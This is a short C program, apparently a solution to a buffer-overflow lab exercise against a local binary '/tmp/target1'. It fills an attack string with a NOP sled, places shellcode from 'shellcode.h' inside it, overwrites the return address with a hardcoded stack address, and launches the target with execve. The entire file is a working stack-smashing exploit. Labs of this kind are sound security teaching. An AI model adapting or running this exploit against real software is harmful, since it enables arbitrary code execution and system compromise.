#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char attack_string[256 + 2 * sizeof(int) + 1];
  
  memset(attack_string, '\x90', sizeof(attack_string));
  
  attack_string[sizeof(attack_string) - 1] = 0;

  memcpy(attack_string + 100, shellcode, sizeof(shellcode) - 1);

  int *ret = (int *) (attack_string + 256 + sizeof(int));
  *ret = 0xbffffc5c;

  char *args[] = { TARGET, attack_string, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}

